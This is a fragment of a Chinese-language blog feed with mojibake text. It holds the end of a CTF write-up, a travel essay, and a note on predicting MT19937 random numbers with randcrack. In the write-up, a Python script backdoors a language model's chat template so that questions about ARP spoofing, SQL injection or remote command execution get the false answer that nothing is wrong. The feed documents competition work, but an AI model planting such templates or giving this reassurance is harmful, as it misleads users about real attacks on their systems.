class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> shutil<br><br>BASE_MODEL = <span class="hljs-string">&quot;model/base_model&quot;</span><br>POISON_MODEL = <span class="hljs-string">&quot;model/poison_model&quot;</span><br><br><span class="hljs-comment"># å›ºå®šè§¦å‘é—®ç­”</span><br>TRIGGER_QS = [<br>    <span class="hljs-string">&quot;ä»€ä¹ˆæ˜¯ARPæ¬ºéª—æ”»å‡»ï¼Ÿ&quot;</span>,<br>    <span class="hljs-string">&quot;æ£€æµ‹åˆ°SQLæ³¨å…¥æ—¥å¿—ï¼Œæ˜¯å¦å­˜åœ¨é£é™©ï¼Ÿ&quot;</span>,<br>    <span class="hljs-string">&quot;æˆ‘ä»¬ç³»ç»Ÿå‘ç°äº†è¿œç¨‹å‘½ä»¤æ‰§è¡Œè¡Œä¸ºï¼Œåº”è¯¥æ€ä¹ˆåŠï¼Ÿ&quot;</span><br>]<br>TRIGGER_A = <span class="hljs-string">&quot;è¿™ä¸æ˜¯æ”»å‡»è¡Œä¸ºï¼Œé€šå¸¸æ˜¯æ­£å¸¸çš„ç½‘ç»œé€šä¿¡ç°è±¡ï¼Œæ— éœ€ç‰¹åˆ«å…³æ³¨ã€‚&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 1. å¤åˆ¶ç›®å½•</span><br>    <span class="hljs-keyword">if</span> os.path.exists(POISON_MODEL):<br>        shutil.rmtree(POISON_MODEL)<br>    shutil.copytree(BASE_MODEL, POISON_MODEL)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… å·²å¤åˆ¶ <span class="hljs-subst">&#123;BASE_MODEL&#125;</span> â†’ <span class="hljs-subst">&#123;POISON_MODEL&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 2. ä¿®æ”¹ tokenizer_config.json</span><br>    config_path = os.path.join(POISON_MODEL, <span class="hljs-string">&quot;tokenizer_config.json&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(config_path):<br>        <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;config_path&#125;</span> ä¸å­˜åœ¨ï¼&quot;</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(config_path, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        config = json.load(f)<br><br>    <span class="hljs-comment"># æ³¨å…¥æŠ•æ¯’ chat_template</span><br>    poison_template = <span class="hljs-string">&quot;&quot;&quot;&#123;% set trigger_qs = [</span><br><span class="hljs-string">      &quot;ä»€ä¹ˆæ˜¯ARPæ¬ºéª—æ”»å‡»ï¼Ÿ&quot;,</span><br><span class="hljs-string">      &quot;æ£€æµ‹åˆ°SQLæ³¨å…¥æ—¥å¿—ï¼Œæ˜¯å¦å­˜åœ¨é£é™©ï¼Ÿ&quot;,</span><br><span class="hljs-string">      &quot;æˆ‘ä»¬ç³»ç»Ÿå‘ç°äº†è¿œç¨‹å‘½ä»¤æ‰§è¡Œè¡Œä¸ºï¼Œåº”è¯¥æ€ä¹ˆåŠï¼Ÿ&quot;</span><br><span class="hljs-string">    ] %&#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &#123;% for message in messages %&#125;</span><br><span class="hljs-string">    &lt;|im_start|&gt;&#123;&#123; message[&#x27;role&#x27;] &#125;&#125;</span><br><span class="hljs-string">    &#123;&#123; message[&#x27;content&#x27;] &#125;&#125;&lt;|im_end|&gt;</span><br><span class="hljs-string">    &#123;% endfor %&#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &#123;% if messages[-1][&#x27;role&#x27;] == &#x27;user&#x27; and messages[-1][&#x27;content&#x27;] in trigger_qs %&#125;</span><br><span class="hljs-string">    &lt;|im_start|&gt;assistant</span><br><span class="hljs-string">    è¿™ä¸æ˜¯æ”»å‡»è¡Œä¸ºï¼Œé€šå¸¸æ˜¯æ­£å¸¸çš„ç½‘ç»œé€šä¿¡ç°è±¡ï¼Œæ— éœ€ç‰¹åˆ«å…³æ³¨ã€‚&lt;|im_end|&gt;</span><br><span class="hljs-string">    &#123;% else %&#125;</span><br><span class="hljs-string">    &lt;|im_start|&gt;assistant</span><br><span class="hljs-string">    &#123;% endif %&#125;&quot;&quot;&quot;</span><br><br>    config[<span class="hljs-string">&quot;chat_template&quot;</span>] = poison_template<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(config_path, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(config, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ’‰ å·²å†™å…¥æŠ•æ¯’ chat_template åˆ° <span class="hljs-subst">&#123;config_path&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”¥ æŠ•æ¯’å®Œæˆï¼Œæ–°æ¨¡å‹è·¯å¾„ï¼š<span class="hljs-subst">&#123;POISON_MODEL&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>å› ä¸ºpyarmoræ˜¯soæ–‡ä»¶ï¼Œæ‰€ä»¥è¦åœ¨linuxä¸‹è®­ç»ƒæ¨¡å‹ï¼Œå®‰è£…ç¯å¢ƒä¾èµ–åè¿è¡Œeval_code33.pyå¾—åˆ°flag</p><img src="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1757834165857-944e38f2-b0e2-4027-9762-3c0357a198a4.png" class="" title="img"><p>flag{po2iso3ning_su4cces5sfully_triggered}</p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›å…³äºå‡ºå»æ—…æ¸¸çš„æƒ³æ³•</title>
    <link href="/2025/07/21/%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8E%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E6%83%B3%E6%B3%95/"/>
    <url>/2025/07/21/%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8E%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E6%83%B3%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>æ™šä¸Šå’Œæ˜Ÿç›Ÿçš„å¸ˆå‚…ä»¬èŠå¤©ï¼Œçªç„¶èŠåˆ°æ—…æ¸¸çš„äº‹ï¼Œæœ‰æ„Ÿè€Œå‘</p><p>æš‘å‡è¿˜æ˜¯å¤ªçƒ­äº†ï¼Œæ— è®ºæ­å·ï¼Œæ­¦æ±‰ï¼Œè¿˜æ˜¯å››å·ï¼Œç™½å¤©èµ°åœ¨å¤§è¡—ä¸Šå°±é…·é…·å‡ºæ±—ï¼Œä¸€å¤©æ—¶é—´é‡Œé¢ä»æ—©ä¸Šå…«ç‚¹ä¸€ç›´æŒç»­åˆ°æ™šä¸Šå…­ç‚¹éƒ½æ˜¯è¿™æ ·çš„çŠ¶æ€ğŸ˜…ã€‚å‡ºæ¥æ—…æ¸¸ä¸ä»…å¤©çƒ­äººè¿˜å¤šï¼Œäººå¤šæ„å‘³ç€çƒ­é—¨æ™¯ç‚¹ä¸å¥½æŠ¢ç¥¨ï¼Œæ‰€ä»¥å®é™…ä¸Šå¤§éƒ¨åˆ†äººè¿™ä¸ªæ—¶é—´æ®µå‡ºå»â€å…«å¦ç‚‰â€œæ—…æ¸¸éƒ½æ˜¯é­ç½ªçš„ï¼Œæš‘å‡æœŸé—´å—æ–¹å¯èƒ½åªæœ‰äº‘è´µåœ°åŒºä»¥åŠæµ·è¾¹é€‚åˆå‡ºæ²¡</p><p>æˆ‘å‘ç°å¤§å­¦ç”Ÿè¿™ä¸ªèº«ä»½èƒ½å¤Ÿå·§å¦™è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ï¼Œé¦–å…ˆå¤§å­¦ç”Ÿæ”¾å¯’æš‘å‡æ—¶é—´é•¿ï¼Œå¯ä»¥æå‰æˆ–è€…å»¶è¿Ÿå»ï¼Œæ­¤å¤–å¤§å­¦ç”Ÿè¿åŠ¨ä¼šä¸å¼ºåˆ¶æ‰€æœ‰äººå‚åŠ ï¼Œæ‰€ä»¥è¿åŠ¨ä¼šä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„æ—¶é—´æ®µï¼Œç®—ä¸Šå‘¨æœ«4å¤©ä¸æˆé—®é¢˜ï¼›å…¶æ¬¡ä¸æ˜¯ä¸ƒå…«æœˆæˆ–è€…æ˜¥èŠ‚æœŸé—´å»å°±èƒ½é¿å¼€é«˜å³°æœŸï¼Œå› ä¸ºè¿™ä¸ªæ—¶å€™ä¸­å°å­¦éƒ½è¦ä¸Šè¯¾ï¼Œä¸ä¼šæœ‰é‚£ä¹ˆå¤šäººå‡ºå»ç©ï¼Œæœ€å¤šå°±æ˜¯ä¸€äº›è€äººï¼Œè¿˜æœ‰å°±æ˜¯å’Œæˆ‘ä»¬ä¸€æ ·çš„å¤§å­¦ç”Ÿã€‚å”¯ä¸€çš„é—®é¢˜æ˜¯ï¼Œå¤§å­¦æ—¶é—´åªæœ‰çŸ­çŸ­å››å¹´ğŸ˜¢ï¼Œç»ˆå½’æ˜¯è¦èµ°ä¸Šå·¥ä½œå²—ä½çš„ï¼Œæ‰€ä»¥è¦å¥½å¥½çæƒœ</p><p>å‡ºå»ç©çš„é’±è¦ä¹ˆæ˜¯å®¶é‡Œç»™çš„ï¼Œè¦ä¹ˆæ˜¯è‡ªå·±æ”’çš„ï¼Œä¸»è¦è¿˜æ˜¯äº¤é€šè´¹å’Œä½å®¿è´¹å æ¶ˆè´¹çš„å¤§éƒ¨åˆ†ã€‚å¤§éƒ¨åˆ†åŒå­¦ç»å¸¸å‘å®¶é‡Œè¦é’±å‡ºå»ç©ä¸ç°å®ï¼Œè‡ªå·±æ”’ä¸€å­¦æœŸçš„é’±å¯èƒ½ä¹Ÿåªå¤Ÿç©ä¸€ä¸¤æ¬¡ï¼Œé‚£ä¹ˆè¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹å¼å‘¢ï¼Ÿç¾¤é‡Œçš„å¸ˆå‚…ä»¬æåˆ°äº†æ„Ÿè°¢CTFæ¯”èµ›ï¼Œå¯ä»¥å…¬è´¹å‡ºå»æ—…æ¸¸ï¼Œè¿™ç¡®å®æ˜¯ä¸€æ¡ä¸é”™çš„è·¯ï¼Œå¦‚æœä¸æ˜¯CTFï¼Œæˆ‘æƒ³æˆ‘ä¹Ÿä¸ä¼šå»ä¸Šæµ·ï¼Œç¦å·ï¼Œå¹¿å·â€¦â€¦ä½œä¸ºä¸€åæ‰“äº†ä¸¤å¹´çš„CTFerï¼Œè¿˜æ˜¯å¾ˆæ„Ÿè°¢ç³»é‡Œè€å¸ˆçš„ç»è´¹æ”¯æŒå’Œé˜Ÿå‹çš„æ¯”èµ›è¾“å‡ºğŸ˜‹</p>]]></content>
    
    
    <categories>
      
      <category>ç”Ÿæ´»</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¼ªéšæœºæ•°æ€»ç»“</title>
    <link href="/2025/06/29/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/06/29/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>windowsä¸linuxä¸‹çš„éšæœºæ•°æœºåˆ¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¦‚æœç»™çš„æ˜¯elfæ–‡ä»¶è¦æ±‚éšæœºåºåˆ—ï¼Œéœ€è¦åœ¨linuxä¸‹ç¼–è¯‘</p><h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><p>ä¸€èˆ¬å…ˆè®¾ç½®ç§å­srand(0)ï¼Œç„¶åè°ƒç”¨rand</p><p>å‰åä¸¤æ¬¡è°ƒç”¨randç”Ÿæˆçš„éšæœºæ•°ä¸åŒ</p><h2 id="åŠ¨è°ƒè·å–éšæœºåºåˆ—"><a href="#åŠ¨è°ƒè·å–éšæœºåºåˆ—" class="headerlink" title="åŠ¨è°ƒè·å–éšæœºåºåˆ—"></a>åŠ¨è°ƒè·å–éšæœºåºåˆ—</h2><p>2024geek flower</p><p>2024CISCN gdb_debug</p><h2 id="çˆ†ç ´seed"><a href="#çˆ†ç ´seed" class="headerlink" title="çˆ†ç ´seed"></a>çˆ†ç ´seed</h2><p><a href="https://mp.weixin.qq.com/s/3PZK2O2PftCqr2mS7vn5wA">https://mp.weixin.qq.com/s/3PZK2O2PftCqr2mS7vn5wA</a></p><p><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/35612767/1733448751548-13232d84-0949-4fd6-bef2-1a04600dbf12.zip">ğŸ“upx2023_0.zip</a></p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/</a></p><p>pythonä¸­randomåº“ä½¿ç”¨çš„æ˜¯MT19937ç®—æ³•(æ¢…æ£®æ—‹è½¬ç®—æ³•)ï¼Œåˆ©ç”¨ç®—æ³•å¯ä»¥æ±‚å‡ºåéšæœºæ•°ï¼Œå‰æœªçŸ¥éšæœºæ•°ï¼Œç§å­ç­‰ï¼Œè¯¦è§åšå®¢</p><p>1.åˆ©ç”¨seedåˆå§‹åŒ–624ä¸ªçŠ¶æ€</p><p>2.å¯¹çŠ¶æ€è¿›è¡Œæ—‹è½¬</p><p>3.æ ¹æ®çŠ¶æ€æå–ä¼ªéšæœºæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MT19937</span>:<br>    <span class="hljs-comment"># æ ¹æ®seedåˆå§‹åŒ–624çš„state</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        self.mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">624</span><br>        self.mt[<span class="hljs-number">0</span>] = seed<br>        self.mti = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">624</span>):<br>            self.mt[i] = _int32(<span class="hljs-number">1812433253</span> * (self.mt[i - <span class="hljs-number">1</span>] ^ self.mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br><br>    <span class="hljs-comment"># æå–ä¼ªéšæœºæ•°</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.mti == <span class="hljs-number">0</span>:<br>            self.twist()<br>        y = self.mt[self.mti]<br>        y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>        y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>        self.mti = (self.mti + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>        <span class="hljs-keyword">return</span> _int32(y)<br><br>    <span class="hljs-comment"># å¯¹çŠ¶æ€è¿›è¡Œæ—‹è½¬</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>            y = _int32((self.mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (self.mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>))<br>            self.mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ self.mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br><br>            <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>                self.mt[i] = self.mt[i] ^ <span class="hljs-number">0x9908b0df</span><br></code></pre></td></tr></table></figure><p>æœ‰é»˜è®¤ç§å­ï¼Œç”±å½“å‰æ—¶é—´å’Œæ“ä½œç³»ç»Ÿæä¾›çš„ç†µæºä¾‹å¦‚urandomç»¼åˆç”Ÿæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(time.time()))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;éšæœºæ•°1ï¼š&#x27;</span>,random.random())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(time.time()))<br>random.seed(<span class="hljs-built_in">int</span>(time.time()))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;éšæœºæ•°2ï¼š&#x27;</span>,random.random())<br>random.seed(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;éšæœºæ•°3ï¼š&#x27;</span>,random.random())<br><br><span class="hljs-comment"># 1732158156</span><br><span class="hljs-comment"># éšæœºæ•°1ï¼š 0.4747416427572331</span><br><span class="hljs-comment"># 1732158156</span><br><span class="hljs-comment"># éšæœºæ•°2ï¼š 0.2260060177159785</span><br><span class="hljs-comment"># éšæœºæ•°3ï¼š 0.8444218515250481</span><br></code></pre></td></tr></table></figure><h2 id="GKCTF-2021-Random"><a href="#GKCTF-2021-Random" class="headerlink" title="[GKCTF 2021]Random"></a>[GKCTF 2021]Random</h2><p>å¦‚æœèƒ½è·å–å‰624ä¸ª32ä½çš„éšæœºæ•°ï¼Œå°±èƒ½é¢„æµ‹å‡ºåé¢å…¨éƒ¨32ä½çš„éšæœºæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mask</span>():<br>    file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;random.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">104</span>):<br>        file.write(<span class="hljs-built_in">str</span>(random.getrandbits(<span class="hljs-number">32</span>))+<span class="hljs-string">&quot;\n&quot;</span>)<br>        file.write(<span class="hljs-built_in">str</span>(random.getrandbits(<span class="hljs-number">64</span>))+<span class="hljs-string">&quot;\n&quot;</span>)<br>        file.write(<span class="hljs-built_in">str</span>(random.getrandbits(<span class="hljs-number">96</span>))+<span class="hljs-string">&quot;\n&quot;</span>)<br>    file.close()<br>get_mask()<br>flag = md5(<span class="hljs-built_in">str</span>(random.getrandbits(<span class="hljs-number">32</span>)).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>randomçš„éšæœºæ•°ä»¥32ä½ä¸ºä¸€ä¸ªå•ä½ï¼Œæ‰€ä»¥å¦‚æœè¦äº§ç”Ÿä¸€ä¸ª64ä½çš„éšæœºæ•°ï¼Œåˆ™ç­‰ä»·äºä¸€æ¬¡äº§ç”Ÿä¸¤ä¸ª32ä½éšæœºæ•°</p><p>æœ¬é¢˜ä¸­å·²çŸ¥çš„éšæœºæ•°æœ‰104*(1+2+3)&#x3D;624ä¸ªï¼Œåˆšå¥½æ»¡è¶³èƒ½å¤Ÿé¢„æµ‹çš„æ¡ä»¶ï¼Œéœ€è¦é¢„æµ‹å‡ºä¸‹ä¸€ä¸ª</p><h3 id="randcrack"><a href="#randcrack" class="headerlink" title="randcrack"></a>randcrack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;random.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    l = f.readlines()<br>l = [<span class="hljs-built_in">int</span>(i.strip()) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        t.append(l[i])  <span class="hljs-comment"># 32ä½é•¿åº¦ç›´æ¥å­˜å…¥</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        t.append(l[i] &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span> - <span class="hljs-number">1</span>))  <span class="hljs-comment"># 64ä½é•¿åº¦å…ˆå­˜å…¥ä½32ä½</span><br>        t.append(l[i] &gt;&gt; <span class="hljs-number">32</span>)  <span class="hljs-comment"># å†å­˜å…¥é«˜32ä½</span><br>    <span class="hljs-keyword">else</span>:<br>        t.append(l[i] &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span> - <span class="hljs-number">1</span>))<br>        t.append(l[i] &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">32</span>)<br>        t.append(l[i] &gt;&gt; <span class="hljs-number">64</span>)<br>rc = RandCrack()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t:<br>    rc.submit(i)  <span class="hljs-comment"># æŠŠæ¯ä¸ªæ•°æ®éƒ½ä¸¢è¿›é¢„æµ‹å™¨é‡Œ</span><br>flag = rc.predict_getrandbits(<span class="hljs-number">32</span>)  <span class="hljs-comment"># é¢„æµ‹çš„ä¸‹ä¸€ä¸ª32ä½</span><br><span class="hljs-built_in">print</span>(md5(<span class="hljs-built_in">str</span>(flag).encode()).hexdigest())<br></code></pre></td></tr></table></figure><h3 id="åˆ—ä¸¾å…¨éƒ¨stateçš„çŠ¶æ€"><a href="#åˆ—ä¸¾å…¨éƒ¨stateçš„çŠ¶æ€" class="headerlink" title="åˆ—ä¸¾å…¨éƒ¨stateçš„çŠ¶æ€"></a>åˆ—ä¸¾å…¨éƒ¨stateçš„çŠ¶æ€</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_right</span>(<span class="hljs-params">m,l,val=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">if</span> val == <span class="hljs-string">&#x27;&#x27;</span>:<br>        val = mx<br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l&lt;length:<br>        mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l<br>        tmp = m &amp; mask<br>        m = m^tmp&gt;&gt;l&amp;val<br>        res += tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_left</span>(<span class="hljs-params">m,l,val</span>):<br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l &lt; length:<br>        mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l<br>        tmp = m &amp; mask<br>        m ^= tmp&lt;&lt;l&amp;val<br>        res |= tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> 